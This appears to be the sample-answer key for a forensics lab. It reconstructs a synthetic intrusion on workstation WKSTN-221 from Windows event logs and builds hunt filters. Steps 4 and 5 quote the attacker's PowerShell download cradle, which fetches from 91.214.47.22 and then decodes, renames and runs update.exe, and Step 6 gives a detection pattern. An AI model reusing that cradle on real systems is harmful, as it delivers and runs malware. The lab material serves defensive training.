# Lab 09 — Hands-On Walkthrough Sample Answers

*Sample answers for the Hands-On Walkthrough section of `Labs/Lab09/ReadMe.md`. These are reference answers — your filter, your environment, and your tool version may legitimately produce slightly different values. The interpretation matters more than the exact number.*

---

## Step 1 — Load the security log

**Expected output:** 38 rows in `security-evtx.csv`. Event-ID distribution (Group-Object EventID):

| EventID | Count | Description |
|---|---|---|
| 4688 | 21 | Process creation |
| 4624 | 6 | Successful logon |
| 4625 | 5 | Failed logon |
| 4634 | 2 | Account logoff |
| 4672 | 2 | Special privileges assigned |
| 4648 | 1 | Logon with explicit credentials |
| 4798 | 1 | Local group membership enumerated |

**Verified via:** `python3 -c "import csv; from collections import Counter; rows=list(csv.DictReader(open('Data/WKSTN-221/security-evtx.csv'))); print(len(rows)); [print(eid, c) for eid, c in Counter(r['EventID'] for r in rows).most_common()]"`

**Interpretation:** Process creation (4688) dominates because audit policy is configured to log it. Five failed logons (4625) is a high count for a single workstation. Four of them come from one external IP in 42 seconds, which is the visible footprint of the password-spray attempt the rest of the lab investigates. The single 4648 (explicit-credential) is the entire lateral-movement signal in this log file.

---

## Step 2 — Filter for failed-logon-followed-by-success patterns

**Expected output:** Failed logons (EID 4625) by source IP:

| SourceIP | Count |
|---|---|
| 185.193.126.47 | 4 |
| 10.0.4.42 | 1 |

Only `185.193.126.47` exceeds the `≥3` threshold. The four 4625 events from that IP cluster around 04:00 UTC on 2024-11-14, which is the password-spray pattern.

**Verified via:** `python3 -c "import csv, re; from collections import Counter; rows=list(csv.DictReader(open('Data/WKSTN-221/security-evtx.csv'))); ips=[re.search(r'IpAddress=(\S+)', r['Payload']).group(1) for r in rows if r['EventID']=='4625']; [print(ip, c) for ip, c in Counter(ips).most_common()]"`

**Interpretation:** This filter is one of the canonical hunt-pack filters from §9.3.1. The IP `185.193.126.47` cross-references with the firewall-block evidence in Lab 08 Step 5: the same external IP at the same UTC hour, in two independent log sources. The perimeter firewall denied it at three other hosts and the DNS server but logged no deny for WKSTN-221. These four 4625s show that the attempts reached the workstation anyway, and that gap is a scoping finding in its own right. A `Count >= 3` threshold per source IP filters out the noise from local typo-style failures without missing real spray patterns. The single failure from 10.0.4.42 looks like an internal user mistyping a password.

---

## Step 3 — Filter for explicit-credential lateral movement

**Expected output:** 1 row — TimeCreated `2024-11-14 14:33:18`, UserName `payroll-admin`, with payload containing `SubjectUserName=payroll-admin SubjectDomainName=FINANCE TargetUserName=payroll-admin TargetDomainName=FINANCE TargetServerName=FILESVR-03 IpAddress=10.0.4.18 ProcessName=C:\Windows\System32\cmd.exe`.

> This scenario has two distinct addresses that are easy to conflate. 10.0.4.18 is FILESVR-03, the server this explicit-credential logon targets. 10.0.4.17 is the attacker-controlled pivot host that opened the inbound network logon at 14:31:05. A 4648 carries the *target* server's address.

**Verified via:** `python3 -c "import csv; rows=list(csv.DictReader(open('Data/WKSTN-221/security-evtx.csv'))); [print(r['TimeCreated'], r['UserName'], r['Payload']) for r in rows if r['EventID']=='4648']"`

**Interpretation:** EID 4648 fires on Windows when a user provides explicit credentials to a remote target, the "RunAs" or net-use-with-creds pattern. A 4648 originating from a finance workstation, targeting `FILESVR-03`, and executed from `cmd.exe` is a strong lateral-movement signal. The 14:33:18 timestamp is roughly 12 minutes after `update.exe` ran on this host (14:21:03), which places the lateral-move attempt after the initial compromise.

---

## Step 4 — Suspicious process creation chain

**Expected output:** 1 row — `EventID=4688`, `TimeCreated=2024-11-14 14:19:38`, `UserName=payroll-admin`. The `Payload` contains:

```
NewProcessName=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ProcessId=0x5128
SubjectUserName=payroll-admin
ParentProcessName=C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE
TokenElevationType=%%1938
CommandLine="powershell.exe" -NoProfile -WindowStyle Hidden -EncodedCommand <truncated>
```

**Verified via:** `python3 -c "import csv; rows=list(csv.DictReader(open('Data/WKSTN-221/security-evtx.csv'))); [print(r['TimeCreated'], r['UserName'], r['Payload'][:400]) for r in rows if r['EventID']=='4688' and 'EncodedCommand' in r['Payload']]"`

**Interpretation:** `OUTLOOK.EXE -> POWERSHELL.EXE` is a textbook delivery-chain anomaly, because Outlook should never spawn PowerShell. Combined with `-NoProfile`, `-WindowStyle Hidden`, and `-EncodedCommand`, this is one of the highest-priority hunt-pack hits. The base64 command, visible in full in the raw payload, decodes on this host to `Invoke-WebRequest -Uri 'https://91.214.47.22/h/u.t' -OutFile $env:TEMP\a.tmp`. That is a download-to-disk cradle. The `| IEX` execute-in-memory variant appears in the WEB-APP-03 dataset instead. The two are worth comparing, because the WKSTN-221 form leaves a file on disk to find and the WEB-APP-03 form does not.

---

## Step 5 — Decode the EID 4104 script blocks

**Expected output:** 4 rows of EID 4104 in `powershell-evtx.csv` after 2024-11-14 12:00, each carrying one stage of the attacker payload:

| Time | Script Block (key fragment) |
|---|---|
| 14:19:38 | `Invoke-WebRequest -Uri 'https://91.214.47.22/h/u.t' -OutFile $env:TEMP\a.tmp` |
| 14:20:07 | XOR loop with key `'F1nd4nc3K3y!'` writing to `$env:TEMP\b.tmp`, then `Remove-Item $env:TEMP\a.tmp` (the USN Journal logs the a.tmp delete at 14:20:11.1) |
| 14:20:11 | `Move-Item $env:TEMP\b.tmp $env:TEMP\update.exe -Force` |
| 14:21:02 | `Start-Process $env:TEMP\update.exe` (immediately before Prefetch first-run at 14:21:03) |

**Verified via:** `python3 -c "import csv; rows=list(csv.DictReader(open('Data/WKSTN-221/powershell-evtx.csv'))); [print(r['TimeCreated'], r['Payload'][:200]) for r in rows if r['EventID']=='4104' and r['TimeCreated']>'2024-11-14 12:00']"`

**Interpretation:** The four script blocks make the entire attacker payload readable: download -> XOR-decode -> rename -> execute. Without Script Block Logging enabled, the `-EncodedCommand` from Step 4 alone is opaque base64. With it, the four-stage script chain is the strongest single piece of evidence in the case. The XOR key `F1nd4nc3K3y!` is itself an attacker-specific IOC worth pivoting on across other hosts.

The script-block times line up with the file system. The `b.tmp -> update.exe` rename matches the USN Journal pattern from Lab 04 Step 4 exactly. The Move-Item block at 14:20:11.2 lands just before the `RenameOldName` record at 14:20:11.25, and the USN Journal records both names on MFT record 22417. A rename keeps the record, so the MFT shows only the current name and the USN Journal holds the history. The timing also fits the download. PowerShell logged EID 4106 (script stopped) for `Invoke-WebRequest` at 14:19:48.1, and the decode block ran at 14:20:07.6.

---

## Step 6 — Build a saved filter

**Expected output:** Running `Find-EncodedPowerShell` against `security-evtx.csv` returns 1 row: the same EID 4688 row from Step 4. It is the only 4688 process-creation event whose payload contains `EncodedCommand`, `FromBase64String`, or `IEX`.

**Verified via:** `python3 -c "import csv, re; rows=list(csv.DictReader(open('Data/WKSTN-221/security-evtx.csv'))); [print(r['TimeCreated'], r['UserName'], r['Payload'][:200]) for r in rows if r['EventID']=='4688' and re.search('EncodedCommand|FromBase64String|IEX', r['Payload'])]"`

**Interpretation:** Returning the same row as Step 4 is expected and correct. Step 6 is not meant to find new data. It wraps the working filter into a reusable function, `Find-EncodedPowerShell`, that you can re-run against any future EvtxECmd CSV. That is how a one-off analysis becomes a hunt pack. The function goes into the team's filter folder, alongside parallel functions for failed-then-success logons, EID 7045 with non-standard image paths, EID 4698 task-creation, and similar patterns.

---

## Step 7 (Optional) — Test against real EVTX from EVTX-to-MITRE-Attack

**Note:** This step uses the external `EVTX-to-MITRE-Attack` dataset (https://github.com/mdecrevoisier/EVTX-to-MITRE-Attack) plus `EvtxECmd.exe`. **Neither is present in this repository.** The expected outcome below was not reproduced here. It is reasoning, not a verified count.

**Expected outcome:** Running `Find-EncodedPowerShell` against the parsed `T1059.001 - Powershell` folder should fire on at least the encoded-command samples in that technique folder. If the function fails to fire on samples that obviously match the pattern, that is the coverage gap to fix next.

**Interpretation:** This step is a sanity check, not a deliverable count. It validates that the hand-built filter generalizes beyond the synthetic WKSTN-221 dataset. Hunt packs that have only ever been tested against their own scenario are not actually validated.

---

## Step 8 (Optional) — Run Hayabusa for a Sigma-rule-based cross-check

**Note:** This step uses Hayabusa (https://github.com/Yamato-Security/hayabusa). **The binary is not present in this repository**, and Hayabusa's input format is `.evtx`, not the pre-parsed CSVs in `Data/WKSTN-221/`. The expected outcome below was not reproduced here. It is reasoning, not a verified count.

**Expected outcome:** Hayabusa with current Sigma rules against the WKSTN-221 EVTX collection (if it existed as `.evtx`) should produce hits for at least:

- T1059.001 — PowerShell encoded command
- T1078 — valid accounts (logon-related rules)
- T1110.003 — password spray (multiple 4625 from same source)
- T1543.003 — service installation (the `npcap` kernel-driver install at 02:14:18 UTC, the only EID 7045 in WKSTN-221's `system-evtx.csv`, about 12 hours before the intrusion, so a lead to confirm rather than attacker persistence)
- T1021 — remote services (the EID 4648 explicit-credential lateral move)

**Interpretation:** Hayabusa is the broad complement to the narrow hand-built filters in Steps 2–6. The narrow filters fire deterministically on patterns the analyst already knows, and Hayabusa surfaces patterns the analyst did not think to look for. Real hunt packs use both: narrow filters for known-good patterns, plus a broad Sigma scan as a backstop and regression check.

---

## Summary

Six reproducible deterministic steps, two reasoning steps:

| Step | Source | Finding | Reproducible? |
|---|---|---|---|
| 1 | security-evtx.csv | 38 rows; 7 distinct EIDs | Yes |
| 2 | security-evtx.csv (4625) | 4 failed logons from 185.193.126.47 (spray pattern) | Yes |
| 3 | security-evtx.csv (4648) | 1 explicit-cred logon to FILESVR-03 at 14:33:18 | Yes |
| 4 | security-evtx.csv (4688) | 1 OUTLOOK.EXE -> POWERSHELL.EXE with -EncodedCommand at 14:19:38 | Yes |
| 5 | powershell-evtx.csv (4104) | 4-stage script-block chain (download -> XOR -> rename -> execute) | Yes |
| 6 | Saved function | Reusable `Find-EncodedPowerShell` returns same 1 row | Yes |
| 7 | External EVTX dataset | Filter sanity check | No (external tool / data) |
| 8 | Hayabusa | Sigma-rule cross-check | No (external tool) |

The verifiable hunt-pack filters from Steps 2–6 cover the entire attacker chain on WKSTN-221, from password spray to lateral movement. Together they tell a defensible end-to-end story built purely from event logs.
